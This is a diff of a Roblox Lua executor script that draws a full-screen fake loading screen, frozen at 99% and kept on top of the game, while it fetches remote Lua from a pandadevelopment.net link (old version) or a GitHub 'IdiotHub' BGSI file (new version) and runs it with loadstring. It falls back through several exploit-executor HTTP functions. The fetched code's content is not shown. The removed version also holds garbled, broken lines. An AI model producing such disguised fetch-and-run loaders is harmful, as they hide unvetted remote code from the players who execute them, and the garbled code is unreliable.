@@ -1,105 +1,214 @@
--- Create a new ScreenGui
-local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "LoadingGui"
-loadingGui.Enabled = true
-loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+-- Services
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService") -- Usually available
+local RunService = game:GetService("RunService")
 
--- Create a frame for the loading screen
-local frame = Instance.new("Frame")
-frame.Name = "MainFrame"
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.Position = UDim2.new(0, 0, 0, 0)
-frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark gray background
-frame.BorderSizePixel = 0
-frame.Parent = loadingGui
-
--- Create a loading bar
-local loadingBar = Instance.new("Frame")
-loadingBar.Name = "LoadingBar"
-loadingBar.Size = UDim2.new(0.7, 0, 0.1, 0)
-loadingBar.Position = UDim2.new(0.15, 0, 0.45, 0)
-loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Bright green loading bar
-loadingBar.BorderSizePixel = 0
-loadingBar.Parent = frame
-
--- Create loading text
-local loadingText = Instance.new("TextLabel")
-loadingText.Name = "LoadingText"
-loadingText.Size = UDim2.new(0.7, 0, 0.1, 0)
-loadingText.Position = UDim2.new(0.15, 0, 0.35, 0)
-loadingText.Text = "Loading..."
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.Font = Enum.Font.SourceSansBold
-loadingText.TextSize = 24
-loadingText.Parent = frame
-
--- Create percentage text
-local percentText = Instance.new("TextLabel")
-percentText.Name = "PercentText"
-percentText.Size = UDim2.new(0.7, 0, 0.1, 0)
-percentText.Position = UDim2.new(0.15, 0, 0.55, 0)
-percentText.Text = "0%"
-percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
-percentText.Font = Enum.Font.SourceSansBold
-percentText.TextSize = 24
-percentText.Parent = frame
-
--- Add title text
-local titleText = Instance.new("TextLabel")
-titleText.Name = "TitleText"
-titleText.Size = UDim2.new(0.7, 0, 0.1, 0)
-titleText.Position = UDim2.new(0.15, 0, 0.25, 0)
-titleText.Text = "System Initialization"
-titleText.TextColor3 = Color3.fromRGB(150, 150, 255)
-titleText.Font = Enum.Font.SourceSansBold
-titleText.TextSize = 28
-titleText.TextStrokeTransparency = 0.5
-titleText.Parent = frame
-
--- Add logo area
-local logoFrame = Instance.new("Frame")
-logoFrame.Name = "LogoFrame"
-logoFrame.Size = UDim2.new(0.3, 0, 0.3, 0)
-logoFrame.Position = UDim2.new(0.35, 0, 0.05, 0)
-logoFrame.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-logoFrame.BorderSizePixel = 0
-logoFrame.Parent = frame
-
-local logoText = Instance.new("TextLabel")
-logoText.Name = "LogoText"
-logoText.Size = UDim2.new(1, 0, 1, 0)
-logoText.Text = "BGSI"
-logoText.TextColor3 = Color3.fromRGB(0, 200, 255)
-logoText.Font = Enum.Font.Arcade
-logoText.TextSize = 40
-logoText.Parent = logoFrame
-
--- Add gradient effect to loading bar
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.0, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(1.0, Color3.fromRGB(0, 200, 100))}
-gradient.Rotation = 90
-gradient.Parent = loadingBar
-
--- Create aقاربubitrate animation for loading text
-local pulseAnim = Instance.new(" TweenInfo", TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1))
-local pulseTween = TweenService:Create(loadingText, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1), {TextColor3 = Color3.fromRGB(255, 255, 255)})
-pulseTween:Play()
-
--- Start loading process
-local currentPercent = 0
-local loadThread = coroutine.create(function()
-    while currentPercent < 99 do
-        currentPercent = currentPercent + 1
-        loadingBar.Size = UDim2.new(0.7 * (currentPercent/100), 0, 0.1, 0)
-        percentText.Text = currentPercent.."%"
-        wait(0.05) -- Adjust speed here
+-- Ensure LocalPlayer is available
+local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then
+    warn("LocalPlayer not found. Waiting for LocalPlayer...")
+    repeat task.wait() until Players.LocalPlayer
+    LocalPlayer = Players.LocalPlayer
+    if not LocalPlayer then
+        error("Executor Error: LocalPlayer could not be found. Cannot create GUI.")
+        return
     end
-    percentText.Text = "99%"
-end)
+end
 
--- Start the loading thread and load the provided string
-coroutine.wrap(function()
-    loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    coroutine.resume(loadThread)
-    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/cc40a4a9f7a417f5"))()
-end)()
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ExecutorLoadingScreenGUI_" .. string.sub(HttpService:GenerateGUID(false), 1, 8) -- Unique-ish name
+screenGui.IgnoreGuiInset = true -- Makes the GUI cover the whole screen
+screenGui.ResetOnSpawn = false -- GUI should persist across respawns
+screenGui.DisplayOrder = 2147483647 -- Max display order to be on top
+screenGui.Parent = CoreGui -- Parent to CoreGui for executor GUIs
+
+-- Create a background Frame
+local backgroundFrame = Instance.new("Frame")
+backgroundFrame.Name = "Background"
+backgroundFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45) -- Dark grayish color
+backgroundFrame.BorderSizePixel = 0
+backgroundFrame.Size = UDim2.new(1, 0, 1, 0) -- Cover the entire screen
+backgroundFrame.Parent = screenGui
+
+-- Create a container for loading elements (for centering)
+local loadingContainer = Instance.new("Frame")
+loadingContainer.Name = "LoadingContainer"
+loadingContainer.BackgroundTransparency = 1 -- Make it transparent
+loadingContainer.Size = UDim2.new(0.6, 0, 0.35, 0) -- Adjusted size for better look
+loadingContainer.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center it
+loadingContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingContainer.Parent = backgroundFrame
+
+-- Create a title TextLabel (Cartoony Style)
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "Title"
+titleLabel.Text = "LOADING..."
+titleLabel.Font = Enum.Font.Cartoon -- Cartoony font
+titleLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+titleLabel.TextSize = 60
+titleLabel.TextStrokeTransparency = 0.5
+titleLabel.TextStrokeColor3 = Color3.fromRGB(20,20,20)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
+titleLabel.Position = UDim2.new(0.5, 0, 0.2, 0)
+titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+titleLabel.Parent = loadingContainer
+
+-- Create a loading bar background
+local loadingBarBackground = Instance.new("Frame")
+loadingBarBackground.Name = "LoadingBarBackground"
+loadingBarBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+loadingBarBackground.BorderColor3 = Color3.fromRGB(20,20,20)
+loadingBarBackground.BorderSizePixel = 2
+loadingBarBackground.Size = UDim2.new(0.9, 0, 0.18, 0) -- Adjusted size
+loadingBarBackground.Position = UDim2.new(0.5, 0, 0.65, 0) -- Adjusted position
+loadingBarBackground.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingBarBackground.Parent = loadingContainer
+
+local UICornerForBar = Instance.new("UICorner")
+UICornerForBar.CornerRadius = UDim.new(0, 8)
+UICornerForBar.Parent = loadingBarBackground
+
+-- Create the loading bar itself (the fill)
+local loadingBarFill = Instance.new("Frame")
+loadingBarFill.Name = "LoadingBarFill"
+loadingBarFill.BackgroundColor3 = Color3.fromRGB(70, 130, 180) -- A nice cartoony blue/steel color
+loadingBarFill.BorderSizePixel = 0
+loadingBarFill.Size = UDim2.new(0, 0, 1, 0) -- Starts at 0 width
+loadingBarFill.Parent = loadingBarBackground
+
+local UICornerForFill = Instance.new("UICorner")
+UICornerForFill.CornerRadius = UDim.new(0, 8)
+UICornerForFill.Parent = loadingBarFill
+
+-- Create a percentage TextLabel
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Name = "PercentageLabel"
+percentageLabel.Text = "0%"
+percentageLabel.Font = Enum.Font.Cartoon
+percentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageLabel.TextSize = 30
+percentageLabel.BackgroundTransparency = 1
+percentageLabel.Size = UDim2.new(1, 0, 1, 0)
+percentageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+percentageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+percentageLabel.ZIndex = loadingBarBackground.ZIndex + 1 -- Make sure it's above the fill
+percentageLabel.Parent = loadingBarBackground
+
+-- The URL for the script to load
+local scriptUrl = "https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"
+local scriptContent = nil
+
+-- Coroutine to execute the external script
+local function executeExternalScript()
+    local success, result = pcall(function()
+        print("Executor: Attempting to fetch script from URL:", scriptUrl)
+
+        local fetched = false
+        -- Method 1: Using game:HttpGetAsync (requires game to allow HTTP requests, or executor bypass)
+        if not fetched then
+            local canFetch, fetchResultOrContent = pcall(function()
+                return game:HttpGetAsync(scriptUrl, true) -- True for caching (optional)
+            end)
+            if canFetch and fetchResultOrContent then
+                scriptContent = fetchResultOrContent
+                fetched = true
+                print("Executor: Successfully fetched script content using game:HttpGetAsync.")
+            else
+                warn("Executor: game:HttpGetAsync failed. Reason:", fetchResultOrContent)
+            end
+        end
+
+        -- Method 2: Check if executor provides a common custom HttpGet function
+        -- Common names: 'HttpGet', 'http_get', 'getsynasset', 'request'. Adapt if your executor uses a different name.
+        if not fetched and typeof(HttpGet) == "function" then -- Check for a global 'HttpGet'
+             print("Executor: Trying common executor's HttpGet function...")
+             local executorFetchSuccess, executorFetchContent = pcall(HttpGet, scriptUrl)
+             if executorFetchSuccess and type(executorFetchContent) == "string" then
+                 scriptContent = executorFetchContent
+                 fetched = true
+                 print("Executor: Successfully fetched script content using executor's HttpGet.")
+             else
+                 warn("Executor: Executor's HttpGet also failed or is not available. Reason:", executorFetchContent)
+             end
+        end
+        
+        -- Add more common executor http functions if needed here, e.g. for 'syn' table
+        if not fetched and syn and typeof(syn.request) == "function" then
+            print("Executor: Trying syn.request function...")
+            local synRequestSuccess, synRequestResult = pcall(function()
+                return syn.request({Url = scriptUrl, Method = "GET"}).Body
+            end)
+            if synRequestSuccess and type(synRequestResult) == "string" then
+                scriptContent = synRequestResult
+                fetched = true
+                print("Executor: Successfully fetched script content using syn.request.")
+            else
+                 warn("Executor: syn.request failed. Reason:", synRequestResult)
+            end
+        end
+
+
+        if not fetched or not scriptContent then
+            warn("Executor: FAILED to fetch script from URL using available methods.")
+            warn("Executor: You may need to paste the script content manually into this script (see 'scriptContent' variable),")
+            warn("Executor: or ensure your executor and the game settings allow HTTP requests to the given URL.")
+            -- FALLBACK: Manually paste script content here if all else fails
+            -- scriptContent = [[ -- Paste your Lua script content here -- ]]
+            -- Example: scriptContent = "print('Hello from manually pasted script!')"
+            if not scriptContent then return end -- Exit if no script content after fallbacks
+        end
+
+        local scriptFunction, loadError = loadstring(scriptContent)
+        if scriptFunction then
+            print("Executor: Loadstring successful. Executing script in a new protected environment...")
+            -- Execute the loaded script in a new coroutine to prevent it from halting the loading screen
+            task.spawn(function()
+                local execSuccess, execError = pcall(scriptFunction)
+                if not execSuccess then
+                    warn("Executor: Error executing loaded script:", execError)
+                else
+                    print("Executor: External script executed via loadstring.")
+                end
+            end)
+        else
+            warn("Executor: Loadstring failed:", loadError)
+        end
+    end)
+
+    if not success then
+        warn("Executor: Error in the executeExternalScript function itself:", result)
+    end
+end
+
+-- Start loading the external script in a separate thread
+task.spawn(executeExternalScript)
+
+-- Animate the loading bar
+local targetPercentage = 99
+local currentPercentage = 0
+local loadingDuration = 4 -- seconds for the bar to reach 99% (adjust as needed)
+local startTime = tick()
+
+local animationConnection
+animationConnection = RunService.RenderStepped:Connect(function(deltaTime)
+    if currentPercentage >= targetPercentage then
+        percentageLabel.Text = "99%"
+        loadingBarFill.Size = UDim2.new(0.99, 0, 1, 0)
+        
+        if animationConnection then
+            animationConnection:Disconnect()
+            animationConnection = nil
+            print("Executor: Loading screen reached 99%. Animation stopped. GUI will remain.")
+        end
+        return
+    end
+
+    local elapsedTime = tick() - startTime
+    currentPercentage = math.min(math.floor((elapsedTime / loadingDuration) * targetPercentage), targetPercentage)
+
+    loadingBarFill.Size = UDim2.new(currentPercentage / 100, 0, 1, 0)
+    percentageLabel.Text = tostring(currentPercentage) .. "%"
+end)
